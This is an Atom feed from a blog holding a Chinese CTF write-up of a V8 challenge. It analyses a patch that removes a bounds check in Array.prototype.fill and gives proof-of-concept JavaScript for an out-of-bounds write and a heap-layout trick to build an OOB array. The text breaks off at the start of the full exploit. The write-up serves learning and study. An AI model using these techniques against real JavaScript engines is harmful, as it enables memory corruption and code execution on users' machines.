<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ditto&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-09-25T14:55:18.217Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>ditto</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>KCTF 2019 Q3 V8 exploit</title>
    <link href="http://yoursite.com/2019/09/25/KCTF-2019-Q3-V8-exploit/"/>
    <id>http://yoursite.com/2019/09/25/KCTF-2019-Q3-V8-exploit/</id>
    <published>2019-09-25T13:29:59.000Z</published>
    <updated>2019-09-25T14:55:18.217Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>比赛的时候分析了下..但由于对js不够了解..没想到怎么绕过array.length和end之间的比较.赛后看别人的exp，学到了很多.</p><p>参考:<br><a href="https://bbs.pediy.com/thread-254372.htm" target="_blank" rel="noopener">看雪CTF2019Q3 第十二题：精忠报国 题目设计思路</a><br><a href="https://bbs.pediy.com/thread-254408.htm" target="_blank" rel="noopener">看雪 ctf q3 第十二题：精忠报国</a></p><h3 id="diff"><a href="#diff" class="headerlink" title="diff"></a>diff</h3><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/objects/elements.cc b/src/objects/elements.cc</span><br><span class="line">index 6e5648d2f4..5e259925dc 100644</span><br><span class="line"><span class="comment">--- a/src/objects/elements.cc</span></span><br><span class="line"><span class="comment">+++ b/src/objects/elements.cc</span></span><br><span class="line">@@ -2148,12 +2148,6 @@ class FastElementsAccessor : public ElementsAccessorBase&lt;Subclass, KindTraits&gt; &#123;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     // Make sure we have enough space.</span><br><span class="line"><span class="deletion">-    uint32_t capacity =</span></span><br><span class="line"><span class="deletion">-        Subclass::GetCapacityImpl(*receiver, receiver-&gt;elements());</span></span><br><span class="line"><span class="deletion">-    if (end &gt; capacity) &#123;</span></span><br><span class="line"><span class="deletion">-      Subclass::GrowCapacityAndConvertImpl(receiver, end);</span></span><br><span class="line"><span class="deletion">-      CHECK_EQ(Subclass::kind(), receiver-&gt;GetElementsKind());</span></span><br><span class="line"><span class="deletion">-    &#125;</span></span><br><span class="line">     DCHECK_LE(end, Subclass::GetCapacityImpl(*receiver, receiver-&gt;elements()));</span><br><span class="line"> </span><br><span class="line">     for (uint32_t index = start; index &lt; end; ++index) &#123;</span><br></pre></td></tr></table></figure><p>patch了FillImpl这里<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> Object <span class="title">FillImpl</span><span class="params">(Handle&lt;JSObject&gt; receiver, Handle&lt;Object&gt; obj_value,</span></span></span><br><span class="line"><span class="function"><span class="params">                         <span class="keyword">uint32_t</span> start, <span class="keyword">uint32_t</span> end)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Ensure indexes are within array bounds</span></span><br><span class="line">    DCHECK_LE(<span class="number">0</span>, start);</span><br><span class="line">    DCHECK_LE(start, end);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Make sure COW arrays are copied.</span></span><br><span class="line">    <span class="keyword">if</span> (IsSmiOrObjectElementsKind(Subclass::kind())) &#123;</span><br><span class="line">      JSObject::EnsureWritableFastElements(receiver);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint32_t</span> index = start; index &lt; end; ++index) &#123;</span><br><span class="line">      Subclass::SetImpl(receiver, index, *obj_value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> *receiver;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p>原来的逻辑是当end大于capacity的时候，扩展capacity的大小。这里去掉了capacity和end之间的比较，那么当end大于capacity的时候，就可以得到越界写.<br>通过交叉引用发现如下调用链:<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BUILTIN(A<span class="function"><span class="title">rrayPrototypeFill</span>) -&gt;</span> T<span class="function"><span class="title">ryFastArrayFill</span> -&gt;</span> <span class="function"><span class="title">accessor</span>-&gt;</span>F<span class="function"><span class="title">ill</span> -&gt;</span> FillImpl</span><br></pre></td></tr></table></figure></p><p>可以了解到这是Array内置fill方法的实现.</p><h3 id="构造poc"><a href="#构造poc" class="headerlink" title="构造poc"></a>构造poc</h3><h4 id="BUILTIN的c-写法"><a href="#BUILTIN的c-写法" class="headerlink" title="BUILTIN的c++写法"></a>BUILTIN的c++写法</h4><p>看下BUILTIN:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUILTIN(name)                                                       \</span></span><br><span class="line">  V8_WARN_UNUSED_RESULT <span class="keyword">static</span> Object Builtin_Impl_#<span class="meta">#name(                  \</span></span><br><span class="line">      BuiltinArguments args, Isolate* isolate);                             \</span><br><span class="line">                                                                            \</span><br><span class="line">  V8_NOINLINE <span class="keyword">static</span> Address Builtin_Impl_Stats_#<span class="meta">#name(                     \</span></span><br><span class="line">      <span class="keyword">int</span> args_length, Address* args_object, Isolate* isolate) &#123;            \</span><br><span class="line">    <span class="function">BuiltinArguments <span class="title">args</span><span class="params">(args_length, args_object)</span></span>;                        \</span><br><span class="line">    <span class="function">RuntimeCallTimerScope <span class="title">timer</span><span class="params">(isolate,                                    \</span></span></span><br><span class="line"><span class="function"><span class="params">                                RuntimeCallCounterId::kBuiltin_##name)</span></span>;     \</span><br><span class="line">    TRACE_EVENT0(TRACE_DISABLED_BY_DEFAULT(<span class="string">"v8.runtime"</span>),                   \</span><br><span class="line">                 <span class="string">"V8.Builtin_"</span> #name);                                      \</span><br><span class="line">    <span class="keyword">return</span> Builtin_Impl_##name(args, isolate).ptr();                        \</span><br><span class="line">  &#125;                                                                         \</span><br><span class="line">                                                                            \</span><br><span class="line">  V8_WARN_UNUSED_RESULT Address Builtin_#<span class="meta">#name(                             \</span></span><br><span class="line">      <span class="keyword">int</span> args_length, Address* args_object, Isolate* isolate) &#123;            \</span><br><span class="line">    DCHECK(isolate-&gt;context().is_null() || isolate-&gt;context().IsContext()); \</span><br><span class="line">    <span class="keyword">if</span> (V8_UNLIKELY(TracingFlags::is_runtime_stats_enabled())) &#123;            \</span><br><span class="line">      <span class="keyword">return</span> Builtin_Impl_Stats_##name(args_length, args_object, isolate);  \</span><br><span class="line">    &#125;                                                                       \</span><br><span class="line">    <span class="function">BuiltinArguments <span class="title">args</span><span class="params">(args_length, args_object)</span></span>;                        \</span><br><span class="line">    <span class="keyword">return</span> Builtin_Impl_##name(args, isolate).ptr();                        \</span><br><span class="line">  &#125;                                                                         \</span><br><span class="line">                                                                            \</span><br><span class="line">  V8_WARN_UNUSED_RESULT <span class="keyword">static</span> Object Builtin_Impl_#<span class="meta">#name(                  \</span></span><br><span class="line">      BuiltinArguments args, Isolate* isolate)</span><br></pre></td></tr></table></figure></p><p>c++写的BUILTIN函数会接受一个<code>BuiltinArguments args</code>参数.这个对象用来处理js运行时的参数.<br>BuiltinArguments类继承自Arguments类,BuiltinArguments主要功能是在Arguments中实现的.<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BuiltinArguments</span> :</span> <span class="keyword">public</span> Arguments &#123;</span><br></pre></td></tr></table></figure></p><p>关键成员函数:<br><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span> <span class="keyword">operator</span>[](<span class="built_in">int</span> index) &#123;</span><br><span class="line">  DCHECK_LT(index, length());</span><br><span class="line">  <span class="keyword">return</span> Arguments::<span class="keyword">operator</span>[](index);</span><br><span class="line">&#125;</span><br><span class="line">inline Handle&lt;<span class="built_in">Object</span>&gt; atOrUndefined(Isolate* isolate, <span class="built_in">int</span> index);</span><br><span class="line">inline Handle&lt;<span class="built_in">Object</span>&gt; receiver();</span><br></pre></td></tr></table></figure></p><p><code>atOrUndefined</code>返回参数列表index处的参数，<code>receiver</code>返回调用该内置函数的this对象.即是args[0]</p><h4 id="分析-ArrayPrototypeFill"><a href="#分析-ArrayPrototypeFill" class="headerlink" title="分析 ArrayPrototypeFill"></a>分析 ArrayPrototypeFill</h4><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">BUILTIN(ArrayPrototypeFill) &#123;</span><br><span class="line">  HandleScope scope(isolate);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (isolate-&gt;debug_execution_mode() == DebugInfo::kSideEffects) &#123;</span><br><span class="line">    <span class="keyword">if</span> <span class="function"><span class="params">(!isolate-&gt;debug()-&gt;PerformSideEffectCheckForObject(args.receiver()))</span> &#123;</span></span><br><span class="line"><span class="function">      <span class="title">return</span> <span class="title">ReadOnlyRoots</span><span class="params">(isolate)</span>.<span class="title">exception</span><span class="params">()</span>;</span></span><br><span class="line"><span class="function">    &#125;</span></span><br><span class="line"><span class="function">  &#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  // 1. <span class="title">Let</span> <span class="title">O</span> <span class="title">be</span> ? <span class="title">ToObject</span><span class="params">(<span class="keyword">this</span> value)</span>.</span></span><br><span class="line"><span class="function">  <span class="title">Handle</span>&lt;<span class="title">JSReceiver</span>&gt; <span class="title">receiver</span>;// <span class="title">receiver</span> 是 <span class="title">this</span></span></span><br><span class="line"><span class="function">  <span class="title">ASSIGN_RETURN_FAILURE_ON_EXCEPTION</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">      isolate, receiver, Object::ToObject(isolate, args.receiver()))</span>;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  // 2. <span class="title">Let</span> <span class="title">len</span> <span class="title">be</span> ? <span class="title">ToLength</span><span class="params">(? Get(O, <span class="string">"length"</span>))</span>.</span></span><br><span class="line"><span class="function">  <span class="title">double</span> <span class="title">length</span>; //获取<span class="title">this</span> 的<span class="title">length</span>属性。</span></span><br><span class="line"><span class="function">  <span class="title">MAYBE_ASSIGN_RETURN_FAILURE_ON_EXCEPTION</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">      isolate, length, GetLengthProperty(isolate, receiver))</span>;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  // 3. <span class="title">Let</span> <span class="title">relativeStart</span> <span class="title">be</span> ? <span class="title">ToInteger</span><span class="params">(start)</span>.</span></span><br><span class="line"><span class="function">  // 4. <span class="title">If</span> <span class="title">relativeStart</span> &lt; 0, <span class="title">let</span> <span class="title">k</span> <span class="title">be</span> <span class="title">max</span><span class="params">((len + relativeStart), <span class="number">0</span>)</span>;</span></span><br><span class="line"><span class="function">  //    <span class="title">else</span> <span class="title">let</span> <span class="title">k</span> <span class="title">be</span> <span class="title">min</span><span class="params">(relativeStart, len)</span>.</span></span><br><span class="line"><span class="function">  // 获得 <span class="title">fill</span>函数的<span class="title">start</span>参数</span></span><br><span class="line"><span class="function">  <span class="title">Handle</span>&lt;<span class="title">Object</span>&gt; <span class="title">start</span> = <span class="title">args</span>.<span class="title">atOrUndefined</span><span class="params">(isolate, <span class="number">2</span>)</span>;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  <span class="title">double</span> <span class="title">start_index</span>;</span></span><br><span class="line"><span class="function">  <span class="title">MAYBE_ASSIGN_RETURN_FAILURE_ON_EXCEPTION</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">      isolate, start_index, GetRelativeIndex(isolate, length, start, <span class="number">0</span>))</span>;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  // 5. <span class="title">If</span> <span class="title">end</span> <span class="title">is</span> <span class="title">undefined</span>, <span class="title">let</span> <span class="title">relativeEnd</span> <span class="title">be</span> <span class="title">len</span>;</span></span><br><span class="line"><span class="function">  //    <span class="title">else</span> <span class="title">let</span> <span class="title">relativeEnd</span> <span class="title">be</span> ? <span class="title">ToInteger</span><span class="params">(end)</span>.</span></span><br><span class="line"><span class="function">  // 6. <span class="title">If</span> <span class="title">relativeEnd</span> &lt; 0, <span class="title">let</span> <span class="title">final</span> <span class="title">be</span> <span class="title">max</span><span class="params">((len + relativeEnd), <span class="number">0</span>)</span>;</span></span><br><span class="line"><span class="function">  //    <span class="title">else</span> <span class="title">let</span> <span class="title">final</span> <span class="title">be</span> <span class="title">min</span><span class="params">(relativeEnd, len)</span>.</span></span><br><span class="line"><span class="function">  // 获得<span class="title">fill</span>函数的<span class="title">end</span>参数</span></span><br><span class="line"><span class="function">  <span class="title">Handle</span>&lt;<span class="title">Object</span>&gt; <span class="title">end</span> = <span class="title">args</span>.<span class="title">atOrUndefined</span><span class="params">(isolate, <span class="number">3</span>)</span>;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  <span class="title">double</span> <span class="title">end_index</span>;</span></span><br><span class="line"><span class="function">  <span class="title">MAYBE_ASSIGN_RETURN_FAILURE_ON_EXCEPTION</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">      isolate, end_index, GetRelativeIndex(isolate, length, end, length))</span>;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  <span class="title">if</span> <span class="params">(start_index &gt;= end_index)</span> <span class="title">return</span> *<span class="title">receiver</span>;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  // <span class="title">Ensure</span> <span class="title">indexes</span> <span class="title">are</span> <span class="title">within</span> <span class="title">array</span> <span class="title">bounds</span></span></span><br><span class="line"><span class="function">  <span class="title">DCHECK_LE</span><span class="params">(<span class="number">0</span>, start_index)</span>;</span></span><br><span class="line"><span class="function">  <span class="title">DCHECK_LE</span><span class="params">(start_index, end_index)</span>;</span></span><br><span class="line"><span class="function">  <span class="title">DCHECK_LE</span><span class="params">(end_index, length)</span>;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  <span class="title">Handle</span>&lt;<span class="title">Object</span>&gt; <span class="title">value</span> = <span class="title">args</span>.<span class="title">atOrUndefined</span><span class="params">(isolate, <span class="number">1</span>)</span>;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  <span class="title">if</span> <span class="params">(TryFastArrayFill(isolate, &amp;args, receiver, value, start_index,</span></span></span><br><span class="line"><span class="function"><span class="params">                       end_index))</span> &#123;</span></span><br><span class="line"><span class="function">    <span class="title">return</span> *<span class="title">receiver</span>;</span></span><br><span class="line"><span class="function">  &#125;</span></span><br><span class="line"><span class="function">  <span class="title">return</span> <span class="title">GenericArrayFill</span><span class="params">(isolate, receiver, value, start_index, end_index)</span>;</span></span><br><span class="line"><span class="function">&#125;</span></span><br></pre></td></tr></table></figure><p>获取end这里:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// 5. If <span class="keyword">end</span> <span class="keyword">is</span> undefined, let relativeEnd be <span class="keyword">len</span>;</span><br><span class="line">//    else let relativeEnd be ? ToInteger(<span class="keyword">end</span>).</span><br><span class="line">// <span class="number">6.</span> <span class="keyword">If</span> relativeEnd &lt; <span class="number">0</span>, let <span class="keyword">final</span> be <span class="keyword">max</span>((<span class="keyword">len</span> + relativeEnd), <span class="number">0</span>);</span><br><span class="line">//    else let final be min(relativeEnd, len).</span><br><span class="line">// 获得fill函数的<span class="keyword">end</span>参数</span><br><span class="line">Handle&lt;<span class="keyword">Object</span>&gt; <span class="keyword">end</span> = args.atOrUndefined(isolate, <span class="number">3</span>);</span><br><span class="line">double end_index;</span><br><span class="line">MAYBE_ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">    isolate, end_index, GetRelativeIndex(isolate, length, <span class="keyword">end</span>, <span class="keyword">length</span>));</span><br></pre></td></tr></table></figure></p><p>使用GetRelativeIndex来获取数值：<br><figure class="highlight glsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">V8_WARN_UNUSED_RESULT Maybe&lt;<span class="type">double</span>&gt; GetRelativeIndex(Isolate* isolate,</span><br><span class="line">                                                     <span class="type">double</span> <span class="built_in">length</span>,</span><br><span class="line">                                                     Handle&lt;Object&gt; <span class="keyword">index</span>,</span><br><span class="line">                                                     <span class="type">double</span> init_if_undefined) &#123;</span><br><span class="line">  <span class="type">double</span> relative_index = init_if_undefined;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">index</span>-&gt;IsUndefined()) &#123;</span><br><span class="line">    Handle&lt;Object&gt; relative_index_obj;</span><br><span class="line">    ASSIGN_RETURN_ON_EXCEPTION_VALUE(isolate, relative_index_obj,</span><br><span class="line">                                     Object::ToInteger(isolate, <span class="keyword">index</span>),</span><br><span class="line">                                     Nothing&lt;<span class="type">double</span>&gt;());</span><br><span class="line">    relative_index = relative_index_obj-&gt;Number();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (relative_index &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> Just(std::<span class="built_in">max</span>(<span class="built_in">length</span> + relative_index, <span class="number">0.0</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> Just(std::<span class="built_in">min</span>(relative_index, <span class="built_in">length</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>当end数值大于0的时候，返回end和length两者中的最小值.从这里看好像end不可能大于length，这样的话进入到FillImpl后end是无法大于capacity的，就无法造成越界写.<br>比赛的时候到这里就卡主了，赛后看出题人的出题思路才知道在end这里传入一个有valueOf成员的对象，这样执行ToInteger的时候就会调用这个对象的valueOf函数来获取这个对象的原始值.<br>我们可以在valueOf函数里修改array.length为1，这样array的capacity就会缩小. 而数组原先的length已经保存下来了，我们可以在valueOf中返回一个数值等于数组原先的length的值，这样进入FillImpl中，end就会大于capacity，就可以发生越界写.</p><h4 id="poc"><a href="#poc" class="headerlink" title="poc:"></a>poc:</h4><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">let arr = [<span class="number">1.1</span>];</span><br><span class="line">arr.<span class="built_in">length</span> = <span class="number">0x100</span>;</span><br><span class="line">arr.fill(<span class="number">1.1</span>,<span class="number">0</span>,&#123;</span><br><span class="line">    valueOf:<span class="function"><span class="keyword">function</span><span class="params">()</span>&#123;</span></span><br><span class="line">        arr.<span class="built_in">length</span> = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x100</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>但是这里写入的都是空闲的空间，并不能写入有用的东西.<br>这里只是将 element（FixedDoubleArray）的length改小，element占用的空间还是256×8，GC并没有将后面空闲的内存回收（后面剩下的 254×8没有回收）。<br>这个时候再创建一个对象，并不是从FixedDoubleArray[2]后面分配 , 而是从FixedDobuleArray[256]后面分配. 从FixedDoubleArray[2]到FixedDobuleArray[256]都是GC没有释放掉的空间.</p><p>测试代码:<br><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">let arr = [1.1];</span><br><span class="line">arr.length = 0x100;</span><br><span class="line"><span class="tag">%<span class="selector-tag">DebugPrint</span>(arr)</span>;</span><br><span class="line"><span class="tag">%<span class="selector-tag">SystemBreak</span>()</span>;</span><br><span class="line">arr.fill(1.1,0,&#123;</span><br><span class="line">    valueOf:function()&#123;</span><br><span class="line">        arr.length = 2;</span><br><span class="line"><span class="tag">        %<span class="selector-tag">SystemBreak</span>()</span>;</span><br><span class="line">        let temp = [1.1];</span><br><span class="line"><span class="tag">        %<span class="selector-tag">DebugPrint</span>(temp)</span>;</span><br><span class="line"><span class="tag">        %<span class="selector-tag">SystemBreak</span>()</span>;</span><br><span class="line">        return 0x100;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="tag">%<span class="selector-tag">SystemBreak</span>()</span>;</span><br></pre></td></tr></table></figure></p><p>将arr.length修改为0x100后:<br><img src="/2019/09/25/KCTF-2019-Q3-V8-exploit/1.png" alt=""><br>将arr.length修改为2后:<br><img src="/2019/09/25/KCTF-2019-Q3-V8-exploit/2.png" alt=""><br>创建一个数组,打印的地址为:<br><img src="/2019/09/25/KCTF-2019-Q3-V8-exploit/3.png" alt=""><br>中间的都是空闲的内存，gc没有回收:<br><img src="/2019/09/25/KCTF-2019-Q3-V8-exploit/4.png" alt=""><br>这样的话，越界写的也是空闲内存，并不能覆盖到后面数组的length属性，我们需要挪动下element指向的地方.</p><h4 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h4><p>在valueOf中修改array的成员为对象，改变element的类型，这样就会重新分配一块空间(在原来FixedDobuleArray[256]后面分配)<br><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">let arr = [1.1];</span><br><span class="line">let buf = [];</span><br><span class="line">arr.length = 0x100;</span><br><span class="line"><span class="tag">%<span class="selector-tag">DebugPrint</span>(arr)</span>;</span><br><span class="line"><span class="tag">%<span class="selector-tag">SystemBreak</span>()</span>;</span><br><span class="line">arr.fill(1.1,0,&#123;</span><br><span class="line">    valueOf:function()&#123;</span><br><span class="line">        arr.length = 2;</span><br><span class="line"><span class="tag">        %<span class="selector-tag">SystemBreak</span>()</span>;</span><br><span class="line">        arr[0] = buf;</span><br><span class="line">        let temp = [1.1];</span><br><span class="line"><span class="tag">        %<span class="selector-tag">DebugPrint</span>(temp)</span>;</span><br><span class="line"><span class="tag">        %<span class="selector-tag">SystemBreak</span>()</span>;</span><br><span class="line">        return 0x100;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="tag">%<span class="selector-tag">SystemBreak</span>()</span>;</span><br></pre></td></tr></table></figure></p><p>当修改arr[0] = buf后element类型变为FixedArray.分配在原先FixedDobuleArray[256]后面<br><img src="/2019/09/25/KCTF-2019-Q3-V8-exploit/5.png" alt=""><br>创建的temp也紧跟在element后面:<br><img src="/2019/09/25/KCTF-2019-Q3-V8-exploit/6.png" alt=""></p><p>利用思路就是修改当前数组的下一个数组的length属性，这样就可以得到一个能够越界读写的oob数组，利用思路跟typer那道差不多.</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gc</span>(<span class="params"></span>) </span>&#123; <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++) &#123; <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1000000</span>); &#125; &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">print</span>(<span class="params">s</span>)</span>&#123;<span class="built_in">console</span>.log(s)&#125;;</span><br><span class="line"><span class="class"><span 